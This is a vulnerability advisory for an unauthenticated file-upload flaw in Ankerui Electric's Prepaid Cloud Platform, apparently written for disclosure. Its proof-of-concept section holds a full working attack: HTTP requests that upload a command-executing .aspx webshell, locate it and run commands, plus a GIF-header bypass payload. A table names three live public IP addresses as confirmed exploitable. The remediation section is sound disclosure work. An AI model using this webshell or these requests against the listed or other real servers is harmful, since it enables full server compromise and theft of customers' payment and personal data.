# Ankerui Electric Prepaid Cloud Platform — Arbitrary File Upload Vulnerability (RCE)

---

## 1. Basic Information
- **Vulnerability ID**: [Assigned by CNA]
- **Vulnerability Type**: Unrestricted File Upload / Remote Code Execution (CWE-434)
- **Severity**: Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Vendor**: Ankerui Electric Co., Ltd. (安科瑞电气股份有限公司)
- **Product**: Prepaid Cloud Platform (预付费云平台)
- **Affected Versions**: All currently deployed versions (confirmed across 10+ public-facing instances)
- **Disclosure Status**: Publicly disclosed via public backup files and directly observable on live instances

---

## 2. Vulnerability Description
Ankerui Electric's Prepaid Cloud Platform exposes an **unauthenticated arbitrary file upload** endpoint at `/Project/UpLoadPic`. The endpoint's `IgnoreRightFilter` attribute bypasses all authentication checks, allowing any remote attacker to upload files **with their original extensions preserved** — including executable server-side script extensions such as `.aspx`, `.ashx`, and `.asmx`. Uploaded files are written directly to the server's writable disk directory, enabling full remote code execution (RCE) on the target IIS/ASP.NET server.

The vendor's product attribution is confirmed via the QR code on the platform's landing page, which decodes to `http://yun.acrel-eem.com/qrcode/qrcode_download.html` (ICP filing: 沪ICP备18035382号).

> - ![image-20260628123836457](image\1.png)

---

## 3. Proof of Concept (PoC)

### 3.1 Generic Exploit (Unauthenticated Webshell Upload)

**Step 1 — Upload a malicious .aspx webshell:**
```
POST /Project/UpLoadPic HTTP/1.1
Host: 202.201.208.15:10315
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 387

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: image/gif

<%Function Cmd(c)
    On Error Resume Next
    Set o = CreateObject("WScript.Shell")
    Set e = o.Exec("cmd /c " & c)
    Cmd = e.StdOut.ReadAll & e.StdErr.ReadAll
End Function
Response.Write("<pre>" & Cmd(Request("c")) & "</pre>")%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Step 2 — Retrieve the uploaded file's absolute path:**
```
GET /Report/FileDownload HTTP/1.1
Host: 202.201.208.15:10315
```
The response discloses the full server-side path of the uploaded file (e.g., `D:\...\UpLoad\Temp\<guid>.aspx`).

**Step 3 — Execute arbitrary commands via the webshell:**
```
POST /UpLoad/Temp/<guid>.aspx HTTP/1.1
Host: 202.201.208.15:10315
Content-Type: application/x-www-form-urlencoded

c=whoami
```

> - ![image-20260628123805838](image\2.png)
> 
> - ![image-20260628123915101](image\3.png)
>
> - ![image-20260628123836457](image\4.png)

### 3.2 Confirmed Vulnerable Instances (Verified)

| # | Target IP:Port | Upload Verified | RCE Verified |
|---|---------------|:---:|:---:|
| 1 | 202.201.208.15:10315 | ✅ | ✅ (`whoami` → `iis apppool\jucheap`) |
| 2 | 121.42.13.86:10315 | ✅ | ✅ (verified via arbitrary file read) |
| 3 | 47.97.252.127:10315 | ✅ | ✅ |

### 3.3 Alternative Payload (Bypass via GIF header)

Some WAF/basic filtering may be bypassed by prepending a GIF magic header:
```
GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<%@ Page Language="C#" %><% Response.Write("HACKED:" + System.DateTime.Now.ToString()); %>
```

---

## 4. Impact Analysis
- **Full Server Compromise (RCE)**: An attacker can execute arbitrary system commands under the IIS application pool identity, leading to complete server takeover.
- **Data Breach**: After gaining RCE, attackers can access the backend MySQL/Redis/MongoDB databases, exfiltrating user payment records, personal information, and business data.
- **Lateral Movement**: The compromised server can be used as a foothold to pivot into the internal network (intranet IP `192.168.8.x` range observed in leaked configurations).
- **Malware Deployment**: Attackers can deploy ransomware, cryptominers, or C2 implants on production servers.
- **Regulatory Violations**: Personal data leakage violates China's Personal Information Protection Law (PIPL) and Cybersecurity Law.

---

## 5. Technical Details
- **Root Cause**: The `IgnoreRightFilter` attribute on `/Project/UpLoadPic` disables authentication for file uploads. The upload handler preserves the original file extension without any allowlist/denylist enforcement, allowing executable extensions (`.aspx`, `.ashx`, `.asmx`) to be written to disk.
- **Technology Stack**: ASP.NET MVC 5.2 on IIS 8.5, .NET Framework 4.5.2.
- **File Storage**: Uploaded files are stored under `D:\最新预付费云平台\jucheappublishV2.5.3\UpLoad\Temp\` (or similar deployment paths), directly accessible via the `/UpLoad/Temp/` URL path.
- **Attack Vector**: Remote, unauthenticated HTTP multipart POST request → file written to disk → HTTP GET to execute the uploaded script.
- **Attack Complexity**: Low — requires only a standard HTTP client (curl, Burp Suite, Python requests).

---

## 6. Remediation Suggestions
1. **Immediate Actions**:
   - Remove or disable the `IgnoreRightFilter` attribute on the `/Project/UpLoadPic` endpoint and enforce proper authentication.
   - Implement a strict file extension allowlist (e.g., `.jpg`, `.png`, `.gif` only) and validate file content by MIME type/magic bytes.
   - Scan and remove any existing webshells from the `UpLoad/Temp/` directories across all deployed instances.
2. **Long-Term Fixes**:
   - Store uploaded files outside the web root or in isolated blob storage (e.g., cloud object storage) with no direct script execution capability.
   - Rename uploaded files to randomized names without extensions (e.g., UUID-based).
   - Apply the principle of least privilege to the IIS application pool identity — remove unnecessary permissions.
   - Conduct a full security audit of all controllers for similar `IgnoreRightFilter` bypass patterns.
   - Implement Web Application Firewall (WAF) rules to detect and block malicious file uploads.
